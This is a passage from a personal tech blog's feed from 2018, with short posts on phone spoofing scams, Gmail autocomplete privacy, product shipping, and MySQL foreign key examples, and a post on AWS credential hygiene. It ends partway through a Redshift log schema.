<p>I immediately thought of scam and went through the process of calling the SSA and the fraud hotline but given the hour-long wait-time and the maze of “press X to do Y” I gave up. Doing a quick Google search confirmed that it, in fact, was a scam and I had nothing to worry about.</p>

<p>What’s shocking is how easy it is to spoof a phone number. Especially that of a government agency. It’s extremely illegal and one would think that whatever service was used to do the spoofing would prohibit this from being possible. I consider myself digitally savvy and yet I had to double check. Others may not be so lucky.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Gmail's autocomplete</title>
   <link href="http://dangoldin.com/2018/10/29/gmails-autocomplete/"/>
   <updated>2018-10-29T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2018/10/29/gmails-autocomplete</id>
   <content:encoded><![CDATA[
<p>Ever since I’ve been managing I’ve spent an inordinate amount of time in my inbox. What’s both sad and amazing is how accurate the new Gmail autocompletions (officially called <a href="https://ai.googleblog.com/2018/05/smart-compose-using-neural-networks-to.html">Smart Compose</a>) have gotten. They’re incredibly accurate for common phrases and are likely leveraging very similar technology to what Google is using for their autocomplete search. It’s great for finishing off that last sentence and even acts as a real time phrase thesaurus that helps suggest alternate phrasing.</p>

<p>It does make you think about the information Google is collecting to make this happen. By using Gmail we’re already trusting Google with our sensitive information but this feels like a step beyond. The tech blog linked above addresses this concern by indicating that it’s only used for common phrases but it’s still sending the message contents to the autocomplete servers to get a prediction.</p>

<img src="http://dangoldin.com/assets/static/images/gmail-autocomplete-request.png" width="1110" height="736" alt="Gmail autocomplete request" layout="responsive"/>
<p class="caption">Gmail autocomplete request</p>

<img src="http://dangoldin.com/assets/static/images/gmail-autocomplete-response.png" width="1070" height="696" alt="Gmail autocomplete response" layout="responsive"/>
<p class="caption">Gmail autocomplete response</p>

<p>Google has numerous businesses beyond advertising and has a strong incentive to get privacy right but it’s still shocking how embedded Google is in our lives - personally and professionally.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Just ship it</title>
   <link href="http://dangoldin.com/2018/10/25/just-ship-it/"/>
   <updated>2018-10-25T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2018/10/25/just-ship-it</id>
   <content:encoded><![CDATA[
<p>I don’t know whether it’s the pace of modern life or something else but I no longer have a good intuition for recent events. Things that happened a few months ago feel as if they happened a year ago and things that happened a year ago feel as if they happened multiple years ago. An example of this was Twitter increasing a tweet’s character limit to 280. Try to guess when they increased the limit?</p>

<p>I assumed it was over a year ago but turns out it was officially <a href="https://techcrunch.com/2017/11/07/twitter-officially-expands-its-character-count-to-280-starting-today/">rolled out</a> less than year ago on November 7, 2017. More importantly, and what gets at the subject of the post, there was so much back and forth and consternation and yet now no one really cares.</p>

<p>Talk to anyone involved in startups and you’ll often get advice to just ship and to release early and often. There are always exceptions but these days there really is no reason not to unless you’re working on an extremely risky or litigated field. If you’re worried about consumer reactions or attention there’s no need since they will likely forget everything in a week anyway. We’re so inundated with information now that nothing sticks and we end up getting accustomed to a new normal every day.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Equity in the gig economy</title>
   <link href="http://dangoldin.com/2018/10/13/equity-in-the-gig-economy/"/>
   <updated>2018-10-13T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2018/10/13/equity-in-the-gig-economy</id>
   <content:encoded><![CDATA[
<p>Recently both <a href="https://techcrunch.com/2018/09/23/airbnb-wants-to-give-its-hosts-equity-in-its-business/">AirBnB</a> and <a href="https://gizmodo.com/uber-just-asked-the-sec-permission-to-give-its-drivers-1829708257">Uber</a> have asked the SEC to allow them to give equity to their contractors - hosts in the case of AirBnB and drivers in the case of Uber. The gig economy is clearly here to stay and it’s encouraging that we’re seeing companies trying to adapt to the changes. I’m sure it’s partially for the marketing spin - both AirBnB and Uber have been facing significant criticism lately - but even then this is a good example to set for future companies. We are moving towards the gig economy and being able to give equity to participants is a great way of sharing the wealth.</p>

<p>The amounts are not going to be life changing but there are benefits beyond the purely economic. If and when the companies go public these shares should have some voting rights attached and give the workers a chance to backup their concerns. This has been going on for centuries (since the 17th century according to <a href="https://en.wikipedia.org/wiki/Activist_shareholder">Wikipedia</a>) and is nothing new. What is new is giving people who have historically not had any financial say a concrete way to vote with their wallets.</p>

<p>The idea of giving equity to the participants in the marketplace echoes what’s happening in the blockchain world - participants are able to hold stakes in the network and as the network becomes more valuable so do their stakes. Both of these ideas are novel and it’s going to be interesting to see how they play out.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Incognito mode: Chrome vs Safari</title>
   <link href="http://dangoldin.com/2018/08/21/incognito-mode-chrome-vs-safari/"/>
   <updated>2018-08-21T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2018/08/21/incognito-mode-chrome-vs-safari</id>
   <content:encoded><![CDATA[
<p>To maintain some semblance of privacy I’ve been doing the majority of my searches in incognito mode. I normally use Chrome but a few days ago I had to do some browser testing in Safari and discovered that the two browsers handle incognito mode differently. Chrome’s incognito mode will share cookies across all incognito tabs - equivalent to running another instance of Chrome. Safari, on the other hand, will give each tab as its own cookie store.</p>

<p>This is pure speculation but Apple has been pushing the narrative that they care more about privacy than Google and this reinforces that view. Depending on the scenario either one can be considered less user friendly - Chrome if you truly do want each tab to be unique or Safari if you want the entire incognito session to act as a single browser - so it does seem as if it was just a product decision made by the respective teams. The behavior difference may even be explained by the name - it’s “incognito” in Chrome but “private” in Safari - and they actually do suggest different behaviors. I wonder if we’ll see a browser with support for both types.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Yahoo fantasy football stats: 2018-2019 edition</title>
   <link href="http://dangoldin.com/2018/08/18/yahoo-fantasy-football-stats-2018-2019-edition/"/>
   <updated>2018-08-18T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2018/08/18/yahoo-fantasy-football-stats-2018-2019-edition</id>
   <content:encoded><![CDATA[
<p>This is much later than in previous years but hopefully that just makes the data more accurate. I updated my Yahoo fantasy football stats scraper to account for the slightly different design for the upcoming season. It still works as before and uses Selenium to open up Chrome and scrape the projected stats by week. The change this year involved shifting the columns around a tiny bit as Yahoo changed the order but other than that there were no changes. Maybe by next year I’ll update the script to be able to actually determine the column indices for each stat automatically. As usual, the script is up on <a href="https://github.com/dangoldin/yahoo-ffl">GitHub</a> and the scraped data can just be downloaded <a href="http://dangoldin.com/assets/static/data/stats-2019.csv">here</a>.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Google Calendar: Constantly shipping</title>
   <link href="http://dangoldin.com/2018/08/15/google-calendar-constantly-shipping/"/>
   <updated>2018-08-15T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2018/08/15/google-calendar-constantly-shipping</id>
   <content:encoded><![CDATA[
<p>It’s impressive when companies constantly churn out products and features and it’s even more impressive the larger the company. In my mind this used to be Amazon but lately I’ve been surprised by how often Google Calendar is updated. It feels as if every month there’s at least one update that I accidentally discover and get a pleasant surprise.</p>

<p>Google Calendar underwent a major redesign earlier this year and it seemed to have been the foundation for the recent improvements. I’m sure I’m not capturing everything but just in the past few months the following features were launched:</p>

<ul>
  <li><strong>Room suggestions</strong>. By adding a bit of metadata to each room ranging from location to capacity Google Calendar suggest a room that matches the size and location of your guestlist.</li>
  <li><strong>Cancellation notification</strong>. If everyone invited to a meeting declines Google lets you know and gives you the option of releasing the booked room.</li>
  <li><strong>OOO handling</strong>. This one is great. I booked a meeting with the subject “OOO” and got the option to automatically decline all invites during that time.</li>
  <li><strong>Time proposals</strong>. This is a small addition but a nice touch that allows an invitee to propose a new time straight from the invite.</li>
  <li>A ton more that can be found on the wonderful <a href="https://gsuiteupdates.googleblog.com/search/label/Google%20Calendar">GSuite update blog</a>.</li>
</ul>

<p>The features themselves are not important and I expect them to get more and more intelligent as Google applies more and more of its AI prowess to automating more and more of our lives. I really like this as an example of investing in a proper foundation which then increases your ability to quickly ship new features and code.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Privacy vs user experience</title>
   <link href="http://dangoldin.com/2018/07/29/privacy-vs-user-experience/"/>
   <updated>2018-07-29T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2018/07/29/privacy-vs-user-experience</id>
   <content:encoded><![CDATA[
<p>These days it feels as if every tech behemoth is competing with every other tech behemoth but one of the more interesting battles has been between Google and Apple. Google is the accepted leader in ML and AI and they leverage it to offer a better and constantly improving user experience. Apple, on the other hand, has been stressing that unlike Google it doesn’t make money off of data mining your data and is instead focused on privacy.</p>

<p>More data is an incredible advantage when it comes to training AI models and Google is king. We all want privacy but the question is whether the benefit of privacy outweighs the convenience of opening up your data. Every person has a different opinion but as these AI models improve the improved experience will take precedence over the benefits of privacy for more and more people until only a minority grasps to their data.</p>

<p>That’s why I was glad to see <a href="https://techcrunch.com/2018/06/29/apple-is-rebuilding-maps-from-the-ground-up/">this mention</a> of Apple leveraging iPhone sensors to collect anonymous data snippets that preserve privacy while feeding into the models. The resulting models may not be as great as those built on identifiable information but it’s much better than the alternative.</p>

<blockquote>
  <p>The secret sauce here is what Apple calls probe data. Essentially little slices of vector data that represent direction and speed transmitted back to Apple completely anonymized with no way to tie it to a specific user or even any given trip. It’s reaching in and sipping a tiny amount of data from millions of users instead, giving it a holistic, real-time picture without compromising user privacy.</p>
</blockquote>

<blockquote>
  <p>If you’re driving, walking or cycling, your iPhone can already tell this. Now if it knows you’re driving, it also can send relevant traffic and routing data in these anonymous slivers to improve the entire service. This only happens if your Maps app has been active, say you check the map, look for directions, etc. If you’re actively using your GPS for walking or driving, then the updates are more precise and can help with walking improvements like charting new pedestrian paths through parks — building out the map’s overall quality.</p>
</blockquote>

<p>I’m hopeful that this model succeeds and proves that great predictions are possible while relying on anonymized data. More importantly, the fact that the data itself is anonymous may even lead to it being open sourced and help the industry compete against those leveraging proprietary data.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Bulk discounts hurt competition</title>
   <link href="http://dangoldin.com/2018/07/22/bulk-discounts-hurt-competition/"/>
   <updated>2018-07-22T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2018/07/22/bulk-discounts-hurt-competition</id>
   <content:encoded><![CDATA[
<p>While reading yet another <a href="https://www.theinformation.com/articles/how-segway-ninebot-became-the-go-to-scooter-maker-for-rental-startups">article</a> about scooter startups I came across an obvious quote by Gao Lufeng, CEO of Segway-Ninebot, the leading scooter manufacturer: “As one of the biggest battery buyers, we have the bargaining power to get the lowest price in the market.”</p>

<p>This is obvious and we see it everywhere: buying in bulk gets you a discount. As a consumer I can go to Amazon and look at any item and the per unit price when buying a single item is going to be higher than when buying a pack. And the more I buy the more the discount on a per unit basis. The business world is no different and it’s not surprising since both sides benefit in this situation: the buyer is able to get a cheaper product and the seller is able to get guaranteed sales while hopefully getting more efficiencies of scale and which further reduces the manufacturing cost.</p>

<p>While rational in the short term it may not be optimal for the seller in the long term. By treating one buyer better than the others the seller is giving that buyer a market advantage. And if that buyer is already the dominant player then they become even more dominant. In the short term it’s not a big deal since the seller is selling each item at the maximum price a buyer is willing to pay but in the long term it may drive out other companies in the market and end up in a <a href="https://en.wikipedia.org/wiki/Monopsony">monopsony</a> where the seller has no other buyers.</p>

<p>This reminds me of a point I heard in a <a href="http://exponent.fm/episode-144-90s-alt-forever/">Exponent.fm podcast</a> about Spotify: the studios want as much competition in the streaming space as possible since it prevents any single buyer from becoming dominant enough to drive the market. In this way Spotify, Apple Music, Google Music, Amazon Music, Pandora, Tidal, and all the others are competing with one another which gives the studios pricing power over each individual company. If there was a single buyer for all the music then the studios would be in a much weaker negotiating position.</p>

<p>Of course, this is all just speculation and the fact that this practice goes on across industries implies that this short term vs long term trade-off is worth it. In most industries there’s likely a lot more driving the success of a business than their unit costs and these discounts don’t actually influence market dynamics. At the same time there probably are industries where the margins are what determine market power and success. And in these industries it would be interesting to see sellers give everyone the same price based on their total manufactured volume. This would give each of their customers the same playing field and encourage competition which improves the suppliers leverage in the long term.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Class action settlement emails</title>
   <link href="http://dangoldin.com/2018/07/21/class-action-settlement-emails/"/>
   <updated>2018-07-21T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2018/07/21/class-action-settlement-emails</id>
   <content:encoded><![CDATA[
<p>I enjoy receiving the occasional class action emails. Other than being a customer during a particular period I didn’t do anything to encourage this and it’s always a surprise that usually comes with a free gift. Sometimes it’s a few dollars, other times it’s a free service, while other times it’s something I’m not qualified nor interested in.</p>

<p>Last week I received an email from Optimum around a class action settlement. Optimum was my ISP years ago and I never had any problems so this email was a pleasant surprise. At the same time I can’t recall the last time I needed a wifi pass when traveling since so many shops and public spaces are already offering it for free.</p>

<p>What I find interesting is that the email was sent on July 11 but can only be acted on August 1st. On one hand it’s nice that they gave 3 weeks notice but on the other hand it’s very likely that this email will be lost and very few people will follow up on it. This is a form of <a href="https://en.wikipedia.org/wiki/Breakage">breakage</a> and I’m sure was something they thought about when sending the notice. At the same time giving a few customers free wifi for two days puts very little stress on their network and it’s unlikely those same customers would have paid Optimum for the day passes so this feels like a very cheap settlement. At the same time it is free so who am I to complain?</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>In a software world, humanity comes first</title>
   <link href="http://dangoldin.com/2018/07/10/in-a-software-world-humanity-comes-first/"/>
   <updated>2018-07-10T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2018/07/10/in-a-software-world-humanity-comes-first</id>
   <content:encoded><![CDATA[
<p>Google Duplex was announced earlier this year as a way to automate tasks that require a phone call - such as booking an appointment. Rather than calling yourself google has an assistant that understands human speech and speaks convincingly enough to do these simple tasks. Relatedly, a few days I read <a href="https://gizmodo.com/google-is-reportedly-looking-to-take-over-call-centers-1827379911">an article</a> describing how Google is also pushing Duplex to be used in call centers. A bit surprising but makes a ton of sense since the vast majority of the calls are relatively simple tasks that companies are already trying to automate as much as possible using Interactive Voice Response (IVR) systems.</p>

<p>Now imagine both of these becoming successful: we end up in a world where my consumer Duplex is having a conversation with a call center’s Duplex. If only there was a way for machines to communicate directly with each other in a standard protocol instead of depending on some advanced natural language processing.</p>

<p>On a more serious note it’s pretty amazing that that we’re getting to a world where computers are actually able replicate human behaviors. Rather than building systems that can speak to each other via APIs we’re instead building systems that have to speak human first.</p>

<p>This is the same thing that’s happening with self driving cars. Building a self driving car is much more difficult in a world with humans driving than if every car was driven by software. In fact, if we didn’t have human drivers on the road today I suspect we’d already have self driving cars.</p>

<p>The irony is that as software gets better and becomes universal is when it could be dead simple. The software first has to convince us it’s good enough to be human before it can act as a machine.</p>

<p>Maybe this is what’s going to save us from the AI apocalypse.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>MySQL foreign keys</title>
   <link href="http://dangoldin.com/2018/07/07/mysql-foreign-keys/"/>
   <updated>2018-07-07T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2018/07/07/mysql-foreign-keys</id>
   <content:encoded><![CDATA[
<p>Databases are the last layer of defense against corrupt data and the more restrictive you can make them the better. No matter how much validation you may have missed in your code having a strong and restrictive database schema will protect your data. One of the best approaches to building a restrictive schema is using foreign keys which specify how fields from one table relate to the fields of another table. There are a few options here and make it possible for you to specify anything from automatically removing rows when a row they’re referencing is removed to recursively updating rows when their references have changed.</p>

<p>The <a href="https://dev.mysql.com/doc/refman/8.0/en/create-table-foreign-keys.html">MySQL docs</a> give a nice overview of how foreign keys work but they’re light on examples and since I tend to learn best from examples I wanted to share them along with a brief description. Hopefully others find these examples useful as well. Each of the examples creates two tables, test_parent and test_child, with test_child having a different foreign key option on a field referencing the test_parent. I also insert the same data into each one to start and then do a few follow up queries describing what happens in each scenario. Also note that there is both an “ON DELETE” and an “ON UPDATE” option which, as expected, controls the respective behaviors.</p>

<h3 id="restrict">RESTRICT</h3>

<figure class="highlight"><pre><code class="language-sql" data-lang="sql"><span class="k">DROP</span> <span class="k">TABLE</span> <span class="n">IF</span> <span class="k">EXISTS</span> <span class="n">test_child</span><span class="p">;</span>
<span class="k">DROP</span> <span class="k">TABLE</span> <span class="n">IF</span> <span class="k">EXISTS</span> <span class="n">test_parent</span><span class="p">;</span>

<span class="k">CREATE</span> <span class="k">TABLE</span> <span class="n">test_parent</span> <span class="p">(</span>
    <span class="n">id</span> <span class="nb">INT</span> <span class="k">NOT</span> <span class="k">NULL</span><span class="p">,</span>
    <span class="k">PRIMARY</span> <span class="k">KEY</span> <span class="p">(</span><span class="n">id</span><span class="p">)</span>
<span class="p">)</span> <span class="n">ENGINE</span><span class="o">=</span><span class="n">INNODB</span><span class="p">;</span>

<span class="k">CREATE</span> <span class="k">TABLE</span> <span class="n">test_child</span> <span class="p">(</span>
    <span class="n">id</span> <span class="nb">INT</span><span class="p">,</span>
    <span class="n">parent_id</span> <span class="nb">INT</span><span class="p">,</span>
    <span class="k">INDEX</span> <span class="n">par_ind</span> <span class="p">(</span><span class="n">parent_id</span><span class="p">),</span>
    <span class="k">FOREIGN</span> <span class="k">KEY</span> <span class="p">(</span><span class="n">parent_id</span><span class="p">)</span> <span class="k">REFERENCES</span> <span class="n">test_parent</span><span class="p">(</span><span class="n">id</span><span class="p">)</span>
        <span class="k">ON</span> <span class="k">DELETE</span> <span class="k">RESTRICT</span>
        <span class="k">ON</span> <span class="k">UPDATE</span> <span class="k">RESTRICT</span>
<span class="p">)</span> <span class="n">ENGINE</span><span class="o">=</span><span class="n">INNODB</span><span class="p">;</span>

<span class="k">insert</span> <span class="k">into</span> <span class="n">test_parent</span> <span class="p">(</span><span class="n">id</span><span class="p">)</span> <span class="k">VALUES</span> <span class="p">(</span><span class="mi">1</span><span class="p">),</span> <span class="p">(</span><span class="mi">2</span><span class="p">),</span> <span class="p">(</span><span class="mi">3</span><span class="p">),</span> <span class="p">(</span><span class="mi">4</span><span class="p">);</span>
<span class="k">insert</span> <span class="k">into</span> <span class="n">test_child</span> <span class="p">(</span><span class="n">id</span><span class="p">,</span> <span class="n">parent_id</span><span class="p">)</span> <span class="k">VALUES</span> <span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">),</span> <span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">2</span><span class="p">),</span> <span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="mi">3</span><span class="p">),</span> <span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="mi">4</span><span class="p">);</span>

<span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">test_child</span><span class="p">;</span>
<span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">test_parent</span><span class="p">;</span>

<span class="c1">-- This fails since one of test_child rows referneces this row.</span>
<span class="k">delete</span> <span class="k">from</span> <span class="n">test_parent</span> <span class="k">where</span> <span class="n">id</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>

<span class="c1">-- By deleting the associated test_child row first we'll be able to delete the row in test_parent.</span>
<span class="k">delete</span> <span class="k">from</span> <span class="n">test_child</span> <span class="k">where</span> <span class="n">parent_id</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>

<span class="c1">-- Now that there's no test_child row referencing this we're able to delete successfully.</span>
<span class="k">delete</span> <span class="k">from</span> <span class="n">test_parent</span> <span class="k">where</span> <span class="n">id</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>

<span class="c1">-- Similarly, we can't update the key since it's being referenced by one of the child rows.</span>
<span class="k">update</span> <span class="n">test_parent</span> <span class="k">set</span> <span class="n">id</span> <span class="o">=</span> <span class="mi">10</span> <span class="k">where</span> <span class="n">id</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span></code></pre></figure>

<h3 id="cascade">CASCADE</h3>

<figure class="highlight"><pre><code class="language-sql" data-lang="sql"><span class="k">DROP</span> <span class="k">TABLE</span> <span class="n">IF</span> <span class="k">EXISTS</span> <span class="n">test_child</span><span class="p">;</span>
<span class="k">DROP</span> <span class="k">TABLE</span> <span class="n">IF</span> <span class="k">EXISTS</span> <span class="n">test_parent</span><span class="p">;</span>

<span class="k">CREATE</span> <span class="k">TABLE</span> <span class="n">test_parent</span> <span class="p">(</span>
    <span class="n">id</span> <span class="nb">INT</span> <span class="k">NOT</span> <span class="k">NULL</span><span class="p">,</span>
    <span class="k">PRIMARY</span> <span class="k">KEY</span> <span class="p">(</span><span class="n">id</span><span class="p">)</span>
<span class="p">)</span> <span class="n">ENGINE</span><span class="o">=</span><span class="n">INNODB</span><span class="p">;</span>

<span class="k">CREATE</span> <span class="k">TABLE</span> <span class="n">test_child</span> <span class="p">(</span>
    <span class="n">id</span> <span class="nb">INT</span><span class="p">,</span>
    <span class="n">parent_id</span> <span class="nb">INT</span><span class="p">,</span>
    <span class="k">INDEX</span> <span class="n">par_ind</span> <span class="p">(</span><span class="n">parent_id</span><span class="p">),</span>
    <span class="k">FOREIGN</span> <span class="k">KEY</span> <span class="p">(</span><span class="n">parent_id</span><span class="p">)</span> <span class="k">REFERENCES</span> <span class="n">test_parent</span><span class="p">(</span><span class="n">id</span><span class="p">)</span>
        <span class="k">ON</span> <span class="k">DELETE</span> <span class="k">CASCADE</span>
        <span class="k">ON</span> <span class="k">UPDATE</span> <span class="k">CASCADE</span>
<span class="p">)</span> <span class="n">ENGINE</span><span class="o">=</span><span class="n">INNODB</span><span class="p">;</span>

<span class="k">insert</span> <span class="k">into</span> <span class="n">test_parent</span> <span class="p">(</span><span class="n">id</span><span class="p">)</span> <span class="k">VALUES</span> <span class="p">(</span><span class="mi">1</span><span class="p">),</span> <span class="p">(</span><span class="mi">2</span><span class="p">),</span> <span class="p">(</span><span class="mi">3</span><span class="p">),</span> <span class="p">(</span><span class="mi">4</span><span class="p">);</span>
<span class="k">insert</span> <span class="k">into</span> <span class="n">test_child</span> <span class="p">(</span><span class="n">id</span><span class="p">,</span> <span class="n">parent_id</span><span class="p">)</span> <span class="k">VALUES</span> <span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">),</span> <span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">2</span><span class="p">),</span> <span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="mi">3</span><span class="p">),</span> <span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="mi">4</span><span class="p">);</span>

<span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">test_child</span><span class="p">;</span>
<span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">test_parent</span><span class="p">;</span>

<span class="c1">-- This removes both the row in test_parent as well as the associated row in test_child.</span>
<span class="k">delete</span> <span class="k">from</span> <span class="n">test_parent</span> <span class="k">where</span> <span class="n">id</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>

<span class="c1">-- This updates both the row in test_parents as well as the referenced field in test_child.</span>
<span class="k">update</span> <span class="n">test_parent</span> <span class="k">set</span> <span class="n">id</span> <span class="o">=</span> <span class="mi">10</span> <span class="k">where</span> <span class="n">id</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span></code></pre></figure>

<h3 id="set-null">SET NULL</h3>

<p>Note that in this case we can’t even make parent_id NOT NULL in the test_child table create - MySQL rejects that statement.</p>

<figure class="highlight"><pre><code class="language-sql" data-lang="sql"><span class="k">DROP</span> <span class="k">TABLE</span> <span class="n">IF</span> <span class="k">EXISTS</span> <span class="n">test_child</span><span class="p">;</span>
<span class="k">DROP</span> <span class="k">TABLE</span> <span class="n">IF</span> <span class="k">EXISTS</span> <span class="n">test_parent</span><span class="p">;</span>

<span class="k">CREATE</span> <span class="k">TABLE</span> <span class="n">test_parent</span> <span class="p">(</span>
    <span class="n">id</span> <span class="nb">INT</span> <span class="k">NOT</span> <span class="k">NULL</span><span class="p">,</span>
    <span class="k">PRIMARY</span> <span class="k">KEY</span> <span class="p">(</span><span class="n">id</span><span class="p">)</span>
<span class="p">)</span> <span class="n">ENGINE</span><span class="o">=</span><span class="n">INNODB</span><span class="p">;</span>

<span class="k">CREATE</span> <span class="k">TABLE</span> <span class="n">test_child</span> <span class="p">(</span>
    <span class="n">id</span> <span class="nb">INT</span><span class="p">,</span>
    <span class="n">parent_id</span> <span class="nb">INT</span><span class="p">,</span>
    <span class="k">INDEX</span> <span class="n">par_ind</span> <span class="p">(</span><span class="n">parent_id</span><span class="p">),</span>
    <span class="k">FOREIGN</span> <span class="k">KEY</span> <span class="p">(</span><span class="n">parent_id</span><span class="p">)</span> <span class="k">REFERENCES</span> <span class="n">test_parent</span><span class="p">(</span><span class="n">id</span><span class="p">)</span>
        <span class="k">ON</span> <span class="k">DELETE</span> <span class="k">SET</span> <span class="k">NULL</span>
        <span class="k">ON</span> <span class="k">UPDATE</span> <span class="k">SET</span> <span class="k">NULL</span>
<span class="p">)</span> <span class="n">ENGINE</span><span class="o">=</span><span class="n">INNODB</span><span class="p">;</span>

<span class="k">insert</span> <span class="k">into</span> <span class="n">test_parent</span> <span class="p">(</span><span class="n">id</span><span class="p">)</span> <span class="k">VALUES</span> <span class="p">(</span><span class="mi">1</span><span class="p">),</span> <span class="p">(</span><span class="mi">2</span><span class="p">),</span> <span class="p">(</span><span class="mi">3</span><span class="p">),</span> <span class="p">(</span><span class="mi">4</span><span class="p">);</span>
<span class="k">insert</span> <span class="k">into</span> <span class="n">test_child</span> <span class="p">(</span><span class="n">id</span><span class="p">,</span> <span class="n">parent_id</span><span class="p">)</span> <span class="k">VALUES</span> <span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">),</span> <span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mi">2</span><span class="p">),</span> <span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="mi">3</span><span class="p">),</span> <span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="mi">4</span><span class="p">);</span>

<span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">test_parent</span><span class="p">;</span>
<span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">test_child</span><span class="p">;</span>

<span class="c1">-- This deletes the row in test_parent and also makes the parent_id value for the associated row in test_child null.</span>
<span class="k">delete</span> <span class="k">from</span> <span class="n">test_parent</span> <span class="k">where</span> <span class="n">id</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>

<span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">test_child</span><span class="p">;</span>

<span class="c1">-- Similarly, the parent_id field in test_child that used to be 2 is now null.</span>
<span class="k">update</span> <span class="n">test_parent</span> <span class="k">set</span> <span class="n">id</span> <span class="o">=</span> <span class="mi">10</span> <span class="k">where</span> <span class="n">id</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>

<span class="k">select</span> <span class="o">*</span> <span class="k">from</span> <span class="n">test_child</span><span class="p">;</span></code></pre></figure>

<h3 id="no-action">NO ACTION</h3>

<p>No example here since in MySQL this works exactly the same as the RESTRICT option above.</p>

<h3 id="set-default">SET DEFAULT</h3>

<p>This is not a valid option in MySQL using the INNODB engine.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Using personal AWS credentials in production</title>
   <link href="http://dangoldin.com/2018/06/28/using-personal-aws-credentials-in-production/"/>
   <updated>2018-06-28T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2018/06/28/using-personal-aws-credentials-in-production</id>
   <content:encoded><![CDATA[
<p>Earlier this week in a fit of security I went into AWS and revoked my old AWS credentials. I assumed that all would be well but unfortunately didn’t realize that my AWS credentials were being used on a production system that wrote data to S3. Before I revoked them I did see that the recent activity contained S3 but assumed it was just me playing around with the AWS CLI. Of course I shouldn’t have had my AWS credentials used on a live system and of course we updated the application to use its own account. At the same time the experienced taught me a few valuable lessons besides not using personal keys on deployed systems:</p>

<ul>
  <li>Logging should be consistent and accessible. I knew where the logs for this application were but it wasn’t obvious to the rest of the team. More importantly, people shouldn’t have to log in to an instance to access the logs. Instead they should be pushed to a central repository. We have this for some of our applications but not as many as we should.</li>
  <li>Symptom based monitoring really works. I came across this phrase when reading Rob Ewaschuk’s <a href="https://docs.google.com/document/d/199PqyG3UsyXlwieHaqbGiWVa8eMWi8zzAn0YfcApr8Q/edit">observations on alerting and monitoring</a> years ago and it stuck with me. We had a few alerts on this application - ranging from making sure CPU usage was neither too high nor too low, it had a healthy rate of data in, and it had a healthy rate of data out. In this case the application was receiving data and was processing but it failed to upload to S3. This meant that the first two alerts were fine and it was the network out alert that was triggered. This is exactly what you want - in this case that alert encapsulates the others and is really what affects end users. They care that the data is on S3 and don’t worry about the CPU usage or how the instance is receiving the data.</li>
</ul>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>ALB and ELB access log schemas for Redshift</title>
   <link href="http://dangoldin.com/2018/06/05/alb-and-elb-access-log-schemas-for-redshift/"/>
   <updated>2018-06-05T00:00:00-04:00</updated>
   <id>http://dangoldin.com/2018/06/05/alb-and-elb-access-log-schemas-for-redshift</id>
   <content:encoded><![CDATA[
<p>Back in February I <a href="/2018/02/20/analyzing-aws-elb-logs/">wrote</a> about using Redshift to quickly analyze ELB access logs. This worked great until we switched from using ELBs to using ALBs. Unsurprisingly in hindsight but frustrating at the time the ALBs have a different log schema. Both the <a href="https://docs.aws.amazon.com/elasticloadbalancing/latest/classic/access-log-collection.html">Classic</a> and <a href="https://docs.aws.amazon.com/elasticloadbalancing/latest/application/load-balancer-access-logs.html">Application</a> Load Balancer logs are well documented on the AWS site but unfortunately the code to create the appropriate Redshift schema is not. In the hope of helping others and passing it forward I wanted to share the Redshift schemas for both types of access logs.</p>

<figure class="highlight"><pre><code class="language-sql" data-lang="sql"><span class="c1">-- ELB Logs</span>
<span class="k">create</span> <span class="k">table</span> <span class="n">elb_logs</span> <span class="p">(</span>
	<span class="n">requesttime</span> <span class="nb">timestamp</span><span class="p">,</span>
	<span class="n">elbname</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">100</span><span class="p">),</span>
